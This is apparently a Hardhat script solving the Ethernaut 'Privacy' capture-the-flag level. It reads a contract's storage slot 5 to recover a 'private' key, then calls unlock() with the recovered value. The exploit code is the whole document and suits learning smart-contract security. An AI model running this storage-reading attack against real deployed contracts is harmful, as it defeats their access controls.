
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
  let provider = ethers.provider;
  const privacy = await hre.ethers.getContractFactory("Privacy");
  const priv = await privacy.attach("0x47Cf4eB7c585B243371a1f2EF0c57d55bb713521");

  await priv.deployed();

  console.log("attack deployed to:", priv.address);

  let lock = await priv.locked();
  console.log(lock)

  const privs = await provider.getStorageAt("0x47Cf4eB7c585B243371a1f2EF0c57d55bb713521", 5);
  console.log(privs)

  // casting was done in remix
  // in solidity **
  // bytes16 casted = bytes16(bytes32(...))

  await priv.unlock("0x7c480ccadd33f240c6405f08285a255a");

  lock = await priv.locked();
  console.log(lock)
}


main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
